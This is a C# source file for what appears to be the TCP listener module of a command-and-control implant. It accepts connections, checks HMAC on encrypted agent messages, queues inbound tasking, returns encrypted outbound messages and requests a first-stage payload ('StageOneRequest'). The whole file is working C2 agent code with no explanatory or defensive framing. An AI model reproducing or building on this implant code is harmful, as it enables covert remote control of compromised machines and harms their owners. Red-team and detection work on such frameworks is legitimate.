using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;

class TcpCommModule : CommModule
{
    TcpListener Listener;
    ManualResetEvent Status = new ManualResetEvent(false);

    public TcpCommModule(string bindAddress, int bindPort)
    {
        Listener = new TcpListener(IPAddress.Parse(bindAddress), bindPort);
    }

    public override void Start(CryptoController crypto)
    {
        base.Start(crypto);

        Listener.Start();

        Task.Factory.StartNew(delegate ()
        {
            while (ModuleStatus == ModuleStatus.Running)
            {
                Status.Reset();
                Listener.BeginAcceptTcpClient(new AsyncCallback(AcceptCallback), Listener);
                Status.WaitOne();

                Thread.Sleep(1000);
            }
        });
    }

    public override void Stop()
    {
        base.Stop();
        Listener.Stop();
    }

    public void QueueStageRequest()
    {
        var message = new AgentMessage
        {
            Metadata = Metadata,
            Data = new C2Data
            {
                Module = "Core",
                Command = "StageOneRequest"
            }
        };

        base.SendData(message);
    }

    private void AcceptCallback(IAsyncResult ar)
    {
        Status.Set();

        var listener = ar.AsyncState as TcpListener;

        if (ModuleStatus == ModuleStatus.Running)
        {
            var handler = Listener.EndAcceptTcpClient(ar);
            var stream = handler.GetStream();
            var state = new CommStateObject { Worker = stream };
            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
        }
    }

    private void ReadCallback(IAsyncResult ar)
    {
        var state = ar.AsyncState as CommStateObject;
        var stream = state.Worker as NetworkStream;

        var bytesRead = 0;

        try
        {
            bytesRead = stream.EndRead(ar);
        }
        catch { }

        if (bytesRead > 0)
        {
            var data = DataJuggle(bytesRead, stream, state);

            if (Crypto.VerifyHMAC(data))
            {
                var inbound = Crypto.Decrypt<AgentMessage>(data);

                if (inbound != null)
                {
                    Inbound.Enqueue(inbound);
                }
            }
        }

        var outbound = new AgentMessage { Metadata = Metadata };
        
        if (Outbound.Count > 0)
        {
            outbound = Outbound.Dequeue();
        }

        var dataToSend = Crypto.Encrypt(outbound);

        stream.BeginWrite(dataToSend, 0, dataToSend.Length, new AsyncCallback(WriteCallback), stream);
    }

    private void WriteCallback(IAsyncResult ar)
    {
        var stream = ar.AsyncState as NetworkStream;

        stream.EndWrite(ar);
        stream.Close();
    }

    private byte[] DataJuggle(int bytesRead, NetworkStream stream, CommStateObject state)
    {
        var final = new byte[] { };

        var dataReceived = state.Buffer.TrimBytes();

        if (bytesRead == state.Buffer.Length)
        {
            if (state.SwapBuffer != null)
            {
                var tmp = state.SwapBuffer;
                state.SwapBuffer = new byte[tmp.Length + dataReceived.Length];
                Buffer.BlockCopy(tmp, 0, state.SwapBuffer, 0, tmp.Length);
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, tmp.Length, dataReceived.Length);
            }
            else
            {
                state.SwapBuffer = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, state.SwapBuffer, 0, dataReceived.Length);
            }

            Array.Clear(state.Buffer, 0, state.Buffer.Length);
            stream.BeginRead(state.Buffer, 0, state.Buffer.Length, new AsyncCallback(ReadCallback), state);
        }
        else
        {
            if (state.SwapBuffer != null)
            {
                final = new byte[state.SwapBuffer.Length + dataReceived.Length];
                Buffer.BlockCopy(state.SwapBuffer, 0, final, 0, state.SwapBuffer.Length);
                Buffer.BlockCopy(dataReceived, 0, final, state.SwapBuffer.Length, dataReceived.Length);
            }
            else
            {
                final = new byte[dataReceived.Length];
                Buffer.BlockCopy(dataReceived, 0, final, 0, dataReceived.Length);
            }
        }

        return final.TrimBytes();
    }
}